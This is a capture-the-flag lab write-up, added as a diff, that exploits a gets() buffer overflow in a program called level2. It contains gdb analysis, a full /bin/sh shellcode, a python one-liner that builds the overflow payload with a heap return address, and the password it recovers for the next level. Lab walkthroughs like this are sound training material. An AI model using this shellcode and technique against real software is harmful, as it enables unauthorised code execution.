@@ -1,0 +1,55 @@
+The program level2 awaits for user input, then prints it back on stdout before exiting.
+
+>./level2
+test
+test
+>
+
+Let's analyse it with gdb. The main function seems to simply call the [p] function.
+The [p] function does all the job.
+We see it call [gets] like in previous exercise, which is (still) vulnerable to
+buffer overflow. Just like previous exercise, from 76 characters the program Segfaults.
+
+We could use the exploit to execute the shell, but the program contains a check:
+
+(gdb) > and 0xb0000000, %eax
+(gdb) > cmp 0xb0000000, %eax
+(gdb) > jne <p+83>
+
+Basically it checks if the address right before the EIP starts with 0xb. It only continues
+execution if it is not the case. If it finds 0xb, it will print the address and exit.
+Stack addresses start with 0xb, so it checks that the EIP is not a stack address.
+
+But the code calls [strdup] at the end of the function. So the string we input is stored
+somewhere on the heap. Let's try to find where.
+As strdup is called at 0x80483e0, let's set a breakpoint right after that address, at 0x804853d.
+
+(gdb) > b *0x804853d
+Breakpoint 1 at 0x804853d
+(gdb) > r
+e
+e
+Breakpoint 1,0x804853d in p()
+(gdb) > x $eax   // the return value of strdup
+0x804a008: 0x00000065  // e, the value we entered
+
+So the return value of strdup is stored at 0x0804a008!
+On the internet (http://shell-storm.org/shellcode/files/shellcode-219.php) I find a shellcode
+made specifically for gets, which is very useful and convenient.
+
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+The shellcode is 55 characters (I counted) so I need to pad it with 25 more characters. Then I input the address of strdup's return (little endian).
+
+>python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' +
+'X'*25 + '\x08\xa0\x04\x08'" > /tmp/overflow2
+
+Then a simple pipe of the file to level2 solves the problem!
+
+>cat /tmp/overflow2 | ./level2
+$>cd ../level3
+$>cat .pass
+$>492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+
